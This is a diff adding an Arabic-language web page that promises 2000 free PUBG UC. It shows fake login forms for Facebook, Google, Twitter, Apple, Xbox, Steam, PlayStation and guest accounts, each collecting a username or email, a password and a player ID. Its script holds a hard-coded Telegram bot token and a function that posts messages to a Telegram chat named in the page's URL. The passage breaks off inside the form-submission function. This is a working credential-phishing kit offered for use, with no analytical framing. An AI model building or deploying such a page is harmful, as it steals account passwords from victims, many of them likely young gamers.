@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن UC مجاني لببجي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            border: 3px solid #ff6b00;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff6b00, #ff8c00);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header::before {
+            content: "🎯";
+            font-size: 40px;
+            position: absolute;
+            top: 10px;
+            left: 20px;
+        }
+        
+        .header::after {
+            content: "⚡";
+            font-size: 40px;
+            position: absolute;
+            top: 10px;
+            right: 20px;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .uc {
+            color: #ffd700;
+            font-size: 20px;
+            margin: 0 5px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .login-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .login-option {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            padding: 20px 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .login-option:hover {
+            border-color: #ff6b00;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 107, 0, 0.3);
+        }
+        
+        .login-option i {
+            font-size: 35px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .facebook { color: #1877F2; }
+        .google { color: #DB4437; }
+        .twitter { color: #1DA1F2; }
+        .apple { color: #000000; }
+        .guest { color: #666666; }
+        .xbox { color: #107C10; }
+        .steam { color: #000000; }
+        .playstation { color: #003087; }
+        
+        .login-option span {
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .form-container {
+            display: none;
+        }
+        
+        .form-container.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #ff6b00;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #ff6b00, #ff8c00);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #ff8c00, #ff6b00);
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
+            transform: translateY(-2px);
+        }
+        
+        .back-btn {
+            background: #6c757d;
+            margin-top: 10px;
+        }
+        
+        .back-btn:hover {
+            background: #5a6268;
+            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .offer-badge {
+            background: linear-gradient(135deg, #ff6b00, #ff8c00);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
+            border: 2px dashed white;
+        }
+        
+        .uc-count {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff6b00;
+            margin-bottom: 20px;
+        }
+        
+        .player-id-input {
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .platform-selection {
+            margin-bottom: 20px;
+        }
+        
+        .platform-selection select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 16px;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>🎮 شحن UC مجاني لببجي 🎮</h1>
+                <p>احصل على <span class="uc">🪙</span> 2000 UC مجاناً <span class="uc">🪙</span></p>
+            </div>
+            
+            <div class="content">
+                <div class="offer-badge">
+                    ⚡ عرض حصري! شحن مجاني لـ 2000 UC ⚡
+                </div>
+                
+                <div class="uc-count">
+                    <span class="uc">🪙</span> 2000 UC مجاناً <span class="uc">🪙</span>
+                </div>
+                
+                <!-- اختيار طريقة التسجيل -->
+                <div id="loginSelection">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #333;">اختر طريقة التسجيل:</h3>
+                    <div class="login-options">
+                        <div class="login-option" onclick="showLoginForm('facebook')">
+                            <i class="facebook">👤</i>
+                            <span>فيسبوك</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('google')">
+                            <i class="google">🔍</i>
+                            <span>جوجل</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('twitter')">
+                            <i class="twitter">🐦</i>
+                            <span>تويتر</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('apple')">
+                            <i class="apple">🍎</i>
+                            <span>Apple</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('guest')">
+                            <i class="guest">🎮</i>
+                            <span>تسجيل ضيف</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('xbox')">
+                            <i class="xbox">🎯</i>
+                            <span>Xbox</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('steam')">
+                            <i class="steam">💨</i>
+                            <span>Steam</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('playstation')">
+                            <i class="playstation">🎮</i>
+                            <span>PlayStation</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- نماذج التسجيل -->
+                <div id="facebookForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #1877F2;">تسجيل الدخول عبر فيسبوك</h3>
+                    <div class="form-group">
+                        <label for="fbEmail">البريد الإلكتروني أو رقم الهاتف</label>
+                        <input type="text" id="fbEmail" placeholder="أدخل البريد الإلكتروني أو رقم الهاتف">
+                    </div>
+                    <div class="form-group">
+                        <label for="fbPassword">كلمة المرور</label>
+                        <input type="password" id="fbPassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="fbPlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="fbPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('facebook')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="googleForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #DB4437;">تسجيل الدخول عبر جوجل</h3>
+                    <div class="form-group">
+                        <label for="googleEmail">البريد الإلكتروني</label>
+                        <input type="email" id="googleEmail" placeholder="example@gmail.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="googlePassword">كلمة المرور</label>
+                        <input type="password" id="googlePassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="googlePlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="googlePlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('google')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="twitterForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #1DA1F2;">تسجيل الدخول عبر تويتر</h3>
+                    <div class="form-group">
+                        <label for="twitterUsername">اسم المستخدم</label>
+                        <input type="text" id="twitterUsername" placeholder="@username">
+                    </div>
+                    <div class="form-group">
+                        <label for="twitterPassword">كلمة المرور</label>
+                        <input type="password" id="twitterPassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="twitterPlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="twitterPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('twitter')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="appleForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #000000;">تسجيل الدخول عبر Apple</h3>
+                    <div class="form-group">
+                        <label for="appleEmail">Apple ID</label>
+                        <input type="email" id="appleEmail" placeholder="example@icloud.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="applePassword">كلمة المرور</label>
+                        <input type="password" id="applePassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="applePlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="applePlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('apple')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="guestForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #666666;">تسجيل الدخول كضيف</h3>
+                    <div class="form-group">
+                        <label for="guestUsername">اسم المستخدم</label>
+                        <input type="text" id="guestUsername" placeholder="أدخل اسم المستخدم">
+                    </div>
+                    <div class="form-group">
+                        <label for="guestPassword">كلمة المرور</label>
+                        <input type="password" id="guestPassword" placeholder="أنشئ كلمة مرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="guestPlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="guestPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('guest')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="xboxForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #107C10;">تسجيل الدخول عبر Xbox</h3>
+                    <div class="form-group">
+                        <label for="xboxEmail">البريد الإلكتروني</label>
+                        <input type="email" id="xboxEmail" placeholder="example@outlook.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="xboxPassword">كلمة المرور</label>
+                        <input type="password" id="xboxPassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="xboxPlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="xboxPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('xbox')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="steamForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #000000;">تسجيل الدخول عبر Steam</h3>
+                    <div class="form-group">
+                        <label for="steamUsername">اسم المستخدم</label>
+                        <input type="text" id="steamUsername" placeholder="أدخل اسم المستخدم">
+                    </div>
+                    <div class="form-group">
+                        <label for="steamPassword">كلمة المرور</label>
+                        <input type="password" id="steamPassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="steamPlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="steamPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('steam')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <div id="playstationForm" class="form-container">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: #003087;">تسجيل الدخول عبر PlayStation</h3>
+                    <div class="form-group">
+                        <label for="psEmail">البريد الإلكتروني</label>
+                        <input type="email" id="psEmail" placeholder="example@playstation.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="psPassword">كلمة المرور</label>
+                        <input type="password" id="psPassword" placeholder="أدخل كلمة المرور">
+                    </div>
+                    <div class="form-group">
+                        <label for="psPlayerID">معرف اللاعب (Player ID)</label>
+                        <input type="text" id="psPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
+                    </div>
+                    <button class="btn" onclick="submitForm('playstation')">شحن UC 🪙</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8277756807:AAH2xJqXd1ygl97PLq1lvruCeZ9rJVZ26io';
+        
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendToTelegram(message) {
+            const chatId = getChatId();
+            if (!chatId) {
+                console.error('No chatId found');
+                return false;
+            }
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId, 
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        function showLoginForm(platform) {
+            document.getElementById('loginSelection').classList.add('hidden');
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            document.getElementById(platform + 'Form').classList.add('active');
+        }
+        
+        function showLoginSelection() {
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            document.getElementById('loginSelection').classList.remove('hidden');
+        }
+        
+        async function submitForm(platform) {
+            let email, password, phone, username, playerID;
+            
+      
